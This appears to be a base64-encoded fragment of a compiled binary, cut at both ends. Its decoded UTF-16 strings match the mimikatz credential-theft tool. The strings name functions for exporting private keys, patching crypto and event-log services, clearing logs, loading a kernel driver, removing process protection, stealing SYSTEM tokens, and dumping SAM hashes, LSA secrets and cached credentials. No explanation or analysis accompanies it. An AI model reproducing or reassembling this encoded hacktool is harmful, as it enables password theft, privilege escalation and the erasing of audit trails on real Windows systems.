eAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgADsAIABDAGUAcgB0AEcAZQB0AE4AYQBtAGUAUwB0AHIAaQBuAGcAIAAoAGYAbwByACAAbABlAG4AKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AYwBlAHIAdABpAGYAaQBjAGEAdABlAHMAIAA7ACAAQwBlAHIAdABPAHAAZQBuAFMAdABvAHIAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAcAByAG8AdgBpAGQAZQByAAAAAAAAAAAAcAByAG8AdgBpAGQAZQByAHQAeQBwAGUAAAAAAAAAAABtAGEAYwBoAGkAbgBlAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAFMAbwBmAHQAdwBhAHIAZQAgAEsAZQB5ACAAUwB0AG8AcgBhAGcAZQAgAFAAcgBvAHYAaQBkAGUAcgAAAGMAbgBnAHAAcgBvAHYAaQBkAGUAcgAAAAAAAAAAAAAAIAAqACAAUwB0AG8AcgBlACAAIAAgACAAIAAgACAAIAAgADoAIAAnACUAcwAnAAoAIAAqACAAUAByAG8AdgBpAGQAZQByACAAIAAgACAAIAAgADoAIAAnACUAcwAnACAAKAAnACUAcwAnACkACgAgACoAIABQAHIAbwB2AGkAZABlAHIAIAB0AHkAcABlACAAOgAgACcAJQBzACcAIAAoACUAdQApAAoAIAAqACAAQwBOAEcAIABQAHIAbwB2AGkAZABlAHIAIAAgADoAIAAnACUAcwAnAAoAAAAAAAAAAAAKAEMAcgB5AHAAdABvAEEAUABJACAAawBlAHkAcwAgADoACgAAAAAACgAlADIAdQAuACAAJQBzAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAEMAcgB5AHAAdABHAGUAdABVAHMAZQByAEsAZQB5ACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABDAHIAeQBwAHQARwBlAHQAUAByAG8AdgBQAGEAcgBhAG0AIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAoAQwBOAEcAIABrAGUAeQBzACAAOgAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AbABfAGsAZQB5AHMAIAA7ACAATgBDAHIAeQBwAHQATwBwAGUAbgBLAGUAeQAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGwAXwBrAGUAeQBzACAAOwAgAE4AQwByAHkAcAB0AEUAbgB1AG0ASwBlAHkAcwAgACUAMAA4AHgACgAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBsAF8AawBlAHkAcwAgADsAIABOAEMAcgB5AHAAdABPAHAAZQBuAFMAdABvAHIAYQBnAGUAUAByAG8AdgBpAGQAZQByACAAJQAwADgAeAAKAAAAAAAAAAAARQB4AHAAbwByAHQAIABQAG8AbABpAGMAeQAAAAAAAABMAGUAbgBnAHQAaAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAcgBpAG4AdABLAGUAeQBJAG4AZgBvAHMAIAA7ACAATgBDAHIAeQBwAHQARwBlAHQAUAByAG8AcABlAHIAdAB5ACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcAByAGkAbgB0AEsAZQB5AEkAbgBmAG8AcwAgADsAIABDAHIAeQBwAHQARwBlAHQASwBlAHkAUABhAHIAYQBtACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFkARQBTAAAATgBPAAAAAAAJAEUAeABwAG8AcgB0AGEAYgBsAGUAIABrAGUAeQAgADoAIAAlAHMACgAJAEsAZQB5ACAAcwBpAHoAZQAgACAAIAAgACAAIAAgADoAIAAlAHUACgAAAAAAcAB2AGsAAABDAEEAUABJAFAAUgBJAFYAQQBUAEUAQgBMAE8AQgAAAE8ASwAAAAAASwBPAAAAAAAJAFAAcgBpAHYAYQB0AGUAIABlAHgAcABvAHIAdAAgADoAIAAlAHMAIAAtACAAAAAnACUAcwAnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAEUAeABwAG8AcgB0ACAALwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEsAZQB5AFQAbwBGAGkAbABlACAAOwAgAGsAdQBoAGwAXwBtAF8AYwByAHkAcAB0AG8AXwBnAGUAbgBlAHIAYQB0AGUARgBpAGwAZQBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAGQAZQByAAAACQBQAHUAYgBsAGkAYwAgAGUAeABwAG8AcgB0ACAAIAA6ACAAJQBzACAALQAgAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AZQB4AHAAbwByAHQAQwBlAHIAdAAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEMAZQByAHQAIAA7ACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGcAZQBuAGUAcgBhAHQAZQBGAGkAbABlAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABwAGYAeAAAAG0AaQBtAGkAawBhAHQAegAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAGUAeABwAG8AcgB0AEMAZQByAHQAIAA7ACAARQB4AHAAbwByAHQAIAAvACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAlAHMAXwAlAHMAXwAlAHUAXwAlAHMALgAlAHMAAAAAAEEAVABfAEsARQBZAEUAWABDAEgAQQBOAEcARQAAAAAAQQBUAF8AUwBJAEcATgBBAFQAVQBSAEUAAAAAAAAAAABDAE4ARwAgAEsAZQB5AAAAcgBzAGEAZQBuAGgALgBkAGwAbAAAAAAATABvAGMAYQBsACAAQwByAHkAcAB0AG8AQQBQAEkAIABwAGEAdABjAGgAZQBkAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGMAcgB5AHAAdABvAF8AcABfAGMAYQBwAGkAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBjAHIAeQBwAHQAbwBfAHAAXwBjAGEAcABpACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAG4AYwByAHkAcAB0AC4AZABsAGwAAAAAAG4AYwByAHkAcAB0AHAAcgBvAHYALgBkAGwAbAAAAAAASwBlAHkASQBzAG8AAAAAAEMAbABlAGEAcgAgAGEAbgAgAGUAdgBlAG4AdAAgAGwAbwBnAAAAAABjAGwAZQBhAHIAAAAAAAAAAAAAAAAAAABbAGUAeABwAGUAcgBpAG0AZQBuAHQAYQBsAF0AIABwAGEAdABjAGgAIABFAHYAZQBuAHQAcwAgAHMAZQByAHYAaQBjAGUAIAB0AG8AIABhAHYAbwBpAGQAIABuAGUAdwAgAGUAdgBlAG4AdABzAAAAZAByAG8AcAAAAAAAAAAAAEUAdgBlAG4AdAAgAG0AbwBkAHUAbABlAAAAAAAAAAAAZQB2AGUAbgB0AAAAAAAAAGwAbwBnAAAAZQB2AGUAbgB0AGwAbwBnAC4AZABsAGwAAAAAAAAAAAB3AGUAdgB0AHMAdgBjAC4AZABsAGwAAABFAHYAZQBuAHQATABvAGcAAAAAAAAAAABTAGUAYwB1AHIAaQB0AHkAAAAAAAAAAABVAHMAaQBuAGcAIAAiACUAcwAiACAAZQB2AGUAbgB0ACAAbABvAGcAIAA6AAoAAAAtACAAJQB1ACAAZQB2AGUAbgB0ACgAcwApAAoAAAAAAC0AIABDAGwAZQBhAHIAZQBkACAAIQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBlAHYAZQBuAHQAXwBjAGwAZQBhAHIAIAA7ACAAQwBsAGUAYQByAEUAdgBlAG4AdABMAG8AZwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZQB2AGUAbgB0AF8AYwBsAGUAYQByACAAOwAgAE8AcABlAG4ARQB2AGUAbgB0AEwAbwBnACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAATABpAHMAdAAgAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAAAAAAAAAG0AaQBuAGkAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABGAFMAIABmAGkAbAB0AGUAcgBzAAAAZgBpAGwAdABlAHIAcwAAAEwAaQBzAHQAIABvAGIAagBlAGMAdAAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAAAAAAAAAABuAG8AdABpAGYATwBiAGoAZQBjAHQAAABMAGkAcwB0ACAAcgBlAGcAaQBzAHQAcgB5ACAAbgBvAHQAaQBmAHkAIABjAGEAbABsAGIAYQBjAGsAcwAAAAAAbgBvAHQAaQBmAFIAZQBnAAAAAAAAAAAATABpAHMAdAAgAGkAbQBhAGcAZQAgAG4AbwB0AGkAZgB5ACAAYwBhAGwAbABiAGEAYwBrAHMAAABuAG8AdABpAGYASQBtAGEAZwBlAAAAAABMAGkAcwB0ACAAdABoAHIAZQBhAGQAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAAAAAAAAbgBvAHQAaQBmAFQAaAByAGUAYQBkAAAATABpAHMAdAAgAHAAcgBvAGMAZQBzAHMAIABuAG8AdABpAGYAeQAgAGMAYQBsAGwAYgBhAGMAawBzAAAAAAAAAG4AbwB0AGkAZgBQAHIAbwBjAGUAcwBzAAAAAAAAAAAATABpAHMAdAAgAFMAUwBEAFQAAAAAAAAAcwBzAGQAdAAAAAAAAAAAAEwAaQBzAHQAIABtAG8AZAB1AGwAZQBzAAAAAAAAAAAAbQBvAGQAdQBsAGUAcwAAAFMAZQB0ACAAYQBsAGwAIABwAHIAaQB2AGkAbABlAGcAZQAgAG8AbgAgAHAAcgBvAGMAZQBzAHMAAAAAAAAAAABwAHIAbwBjAGUAcwBzAFAAcgBpAHYAaQBsAGUAZwBlAAAAAAAAAAAARAB1AHAAbABpAGMAYQB0AGUAIABwAHIAbwBjAGUAcwBzACAAdABvAGsAZQBuAAAAcAByAG8AYwBlAHMAcwBUAG8AawBlAG4AAAAAAAAAAABQAHIAbwB0AGUAYwB0ACAAcAByAG8AYwBlAHMAcwAAAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAAAAAAQgBTAE8ARAAgACEAAAAAAGIAcwBvAGQAAAAAAAAAAABSAGUAbQBvAHYAZQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAC0AAAAAAAAAAAAAAEkAbgBzAHQAYQBsAGwAIABhAG4AZAAvAG8AcgAgAHMAdABhAHIAdAAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAACsAAAAAAAAAcgBlAG0AbwB2AGUAAAAAAEwAaQBzAHQAIABwAHIAbwBjAGUAcwBzAAAAAAAAAAAAcAByAG8AYwBlAHMAcwAAAG0AaQBtAGkAZAByAHYALgBzAHkAcwAAAG0AaQBtAGkAZAByAHYAAABbACsAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAYQBsAHIAZQBhAGQAeQAgAHIAZQBnAGkAcwB0AGUAcgBlAGQACgAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABuAG8AdAAgAHAAcgBlAHMAZQBuAHQACgAAAAAAAAAAAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAKABtAGkAbQBpAGQAcgB2ACkAAAAAAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAHMAdQBjAGMAZQBzAHMAZgB1AGwAbAB5ACAAcgBlAGcAaQBzAHQAZQByAGUAZAAKAAAAAAAAAAAAWwArAF0AIABtAGkAbQBpAGsAYQB0AHoAIABkAHIAaQB2AGUAcgAgAEEAQwBMACAAdABvACAAZQB2AGUAcgB5AG8AbgBlAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABXAG8AcgBsAGQAVABvAE0AaQBtAGkAawBhAHQAegAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABDAHIAZQBhAHQAZQBTAGUAcgB2AGkAYwBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGkAcwBGAGkAbABlAEUAeABpAHMAdAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AYQBkAGQAXwBtAGkAbQBpAGQAcgB2ACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAGcAZQB0AEEAYgBzAG8AbAB1AHQAZQBQAGEAdABoAE8AZgAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAYQByAHQAZQBkAAoAAAAAAAAAAABbACoAXQAgAG0AaQBtAGkAawBhAHQAegAgAGQAcgBpAHYAZQByACAAYQBsAHIAZQBhAGQAeQAgAHMAdABhAHIAdABlAGQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBhAGQAZABfAG0AaQBtAGkAZAByAHYAIAA7ACAAUwB0AGEAcgB0AFMAZQByAHYAaQBjAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAGEAZABkAF8AbQBpAG0AaQBkAHIAdgAgADsAIABPAHAAZQBuAFMAQwBNAGEAbgBhAGcAZQByACgAYwByAGUAYQB0AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABzAHQAbwBwAHAAZQBkAAoAAAAAAAAAAAAAAAAAAAAAAFsAKgBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIABuAG8AdAAgAHIAdQBuAG4AaQBuAGcACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHIAZQBtAG8AdgBlAF8AbQBpAG0AaQBkAHIAdgAgADsAIABrAHUAbABsAF8AbQBfAHMAZQByAHYAaQBjAGUAXwBzAHQAbwBwACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFsAKwBdACAAbQBpAG0AaQBrAGEAdAB6ACAAZAByAGkAdgBlAHIAIAByAGUAbQBvAHYAZQBkAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwByAGUAbQBvAHYAZQBfAG0AaQBtAGkAZAByAHYAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AcgBlAG0AbwB2AGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAFAAcgBvAGMAZQBzAHMAIAA6ACAAJQBzAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBrAGUAcgBuAGUAbABfAHAAcgBvAGMAZQBzAHMAUAByAG8AdABlAGMAdAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABQAHIAbwBjAGUAcwBzAEkAZABGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAcABpAGQAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGsAZQByAG4AZQBsAF8AcAByAG8AYwBlAHMAcwBQAHIAbwB0AGUAYwB0ACAAOwAgAEEAcgBnAHUAbQBlAG4AdAAgAC8AcAByAG8AYwBlAHMAcwA6AHAAcgBvAGcAcgBhAG0ALgBlAHgAZQAgAG8AcgAgAC8AcABpAGQAOgBwAHIAbwBjAGUAcwBzAGkAZAAgAG4AZQBlAGQAZQBkAAoAAAAAAAAAAABQAEkARAAgACUAdQAgAC0APgAgACUAMAAyAHgALwAlADAAMgB4ACAAWwAlADEAeAAtACUAMQB4AC0AJQAxAHgAXQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAATgBvACAAUABJAEQACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBwAHIAbwBjAGUAcwBzAFAAcgBvAHQAZQBjAHQAIAA7ACAAUAByAG8AdABlAGMAdABlAGQAIABwAHIAbwBjAGUAcwBzACAAbgBvAHQAIABhAHYAYQBpAGwAYQBiAGwAZQAgAGIAZQBmAG8AcgBlACAAVwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQAKAAAAAABmAHIAbwBtAAAAAAB0AG8AAAAAAAAAAABUAG8AawBlAG4AIABmAHIAbwBtACAAcAByAG8AYwBlAHMAcwAgACUAdQAgAHQAbwAgAHAAcgBvAGMAZQBzAHMAIAAlAHUACgAAAAAAAAAAACAAKgAgAGYAcgBvAG0AIAAwACAAdwBpAGwAbAAgAHQAYQBrAGUAIABTAFkAUwBUAEUATQAgAHQAbwBrAGUAbgAKAAAAAAAAAAAAAAAAAAAAIAAqACAAdABvACAAMAAgAHcAaQBsAGwAIAB0AGEAawBlACAAYQBsAGwAIAAnAGMAbQBkACcAIABhAG4AZAAgACcAbQBpAG0AaQBrAGEAdAB6ACcAIABwAHIAbwBjAGUAcwBzAAoAAABEAGEAdABhAAAAAAAAAAAARwBCAEcAAABTAGsAZQB3ADEAAABKAEQAAAAAAAAAAABEAGUAZgBhAHUAbAB0AAAAQwB1AHIAcgBlAG4AdAAAAAAAAAAAAAAAQQBzAGsAIABTAEEATQAgAFMAZQByAHYAaQBjAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABTAEEATQAgAGUAbgB0AHIAaQBlAHMAIAAoAHAAYQB0AGMAaAAgAG8AbgAgAHQAaABlACAAZgBsAHkAKQAAAAAAcwBhAG0AcgBwAGMAAAAAAAAAAAAAAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAE4ATAAkAEsATQAgAHQAaABlAG4AIABNAFMAQwBhAGMAaABlACgAdgAyACkAIAAoAGYAcgBvAG0AIAByAGUAZwBpAHMAdAByAHkAIABvAHIAIABoAGkAdgBlAHMAKQAAAAAAAABjAGEAYwBoAGUAAAAAAAAAAAAAAAAAAABHAGUAdAAgAHQAaABlACAAUwB5AHMASwBlAHkAIAB0AG8AIABkAGUAYwByAHkAcAB0ACAAUwBFAEMAUgBFAFQAUwAgAGUAbgB0AHIAaQBlAHMAIAAoAGYAcgBvAG0AIAByAGUAZwBpAHMAdAByAHkAIABvAHIAIABoAGkAdgBlAHMAKQAAAAAAcwBlAGMAcgBlAHQAcwAAAAAAAAAAAAAARwBlAHQAIAB0AGgAZQAgAFMAeQBzAEsAZQB5ACAAdABvACAAZABlAGMAcgB5AHAAdAAgAFMAQQBNACAAZQBuAHQAcgBpAGUAcwAgACgAZgByAG8AbQAgAHIAZQBnAGkAcwB0AHIAeQAgAG8AcgAgAGgAaQB2AGUAcwApAAAAAABzAGEAbQAAAEwAcwBhAEQAdQBtAHAAIABtAG8AZAB1AGwAZQAAAAAAbABzAGEAZAB1AG0AcAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBhAG0AIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBZAFMAVABFAE0AIABoAGkAdgBlACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKABTAEEATQAgAGgAaQB2AGUAKQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAABTAFkAUwBUAEUATQAAAAAAUwBBAE0AAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGEAbQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAE8AcABlAG4ASwBlAHkARQB4ACAAKABTAEEATQApACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwByAGUAdABzAE8AcgBDAGEAYwBoAGUAIAA7ACAAQwByAGUAYQB0AGUARgBpAGwAZQAgACgAUwBFAEMAVQBSAEkAVABZACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AcwBlAGMAcgBlAHQAcwBPAHIAQwBhAGMAaABlACAAOwAgAEMAcgBlAGEAdABlAEYAaQBsAGUAIAAoAFMAWQBTAFQARQBNACAAaABpAHYAZQApACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABTAEUAQwBVAFIASQBUAFkAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBzAGUAYwByAGUAdABzAE8AcgBDAGEAYwBoAGUAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgACgAUwBFAEMAVQBSAEkAVABZACkAIAAoADAAeAAlADAAOAB4ACkACgAAAEMAbwBuAHQAcgBvAGwAUwBlAHQAMAAwADAAAAAAAAAAUwBlAGwAZQBjAHQAAAAAACUAMAAzAHUAAAAAACUAeAAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAUwB5AHMAawBlAHkAIAA7ACAATABTAEEAIABLAGUAeQAgAEMAbABhAHMAcwAgAHIAZQBhAGQAIABlAHIAcgBvAHIACgAAAAAARABvAG0AYQBpAG4AIAA6ACAAAAAAAAAAQwBvAG4AdAByAG8AbABcAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAFwAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAAAAAAAAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAAAAAAAAAAAAlAHMACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABLAE8ACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbABzAGEAZAB1AG0AcABfAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBBAG4AZABTAHkAcwBrAGUAeQAgADsAIABwAHIAZQAgAC0AIABrAHUAbABsAF8AbQBfAHIAZQBnAGkAcwB0AHIAeQBfAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABLAE8ACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAASwBPAAoAAAAAAAAAUwB5AHMASwBlAHkAIAA6ACAAAAAAAAAAQwBvAG4AdAByAG8AbABcAEwAUwBBAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABDAG8AbQBwAHUAdABlAHIAQQBuAGQAUwB5AHMAawBlAHkAIAA7ACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAUwB5AHMAawBlAHkAIABLAE8ACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAQwBvAG0AcAB1AHQAZQByAEEAbgBkAFMAeQBzAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcATwBwAGUAbgBLAGUAeQBFAHgAIABMAFMAQQAgAEsATwAKAAAAAAAAAAAAUwBBAE0AXABEAG8AbQBhAGkAbgBzAFwAQQBjAGMAbwB1AG4AdAAAAFUAcwBlAHIAcwAAAAAAAABOAGEAbQBlAHMAAAAAAAAACgBSAEkARAAgACAAOgAgACUAMAA4AHgAIAAoACUAdQApAAoAAAAAAFYAAAAAAAAAVQBzAGUAcgAgADoAIAAlAC4AKgBzAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGwAbABfAG0AXwByAGUAZwBpAHMAdAByAHkAXwBSAGUAZwBRAHUAZQByAHkAVgBhAGwAdQBlAEUAeAAgAFYAIABLAE8ACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQAVQBzAGUAcgBzAEEAbgBkAFMAYQBtAEsAZQB5ACAAOwAgAHAAcgBlACAALQAgAGsAdQBsAGwAXwBtAF8AcgBlAGcAaQBzAHQAcgB5AF8AUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIABWACAASwBPAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGwAcwBhAGQAdQBtAHAAXwBnAGUAdABVAHMAZQByAHMAQQBuAGQAUwBhAG0ASwBlAHkAIAA7ACAAawB1AGgAbABfAG0AXwBsAHMAYQBkAHUAbQBwAF8AZwBlAHQASwBlACAASwBPAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8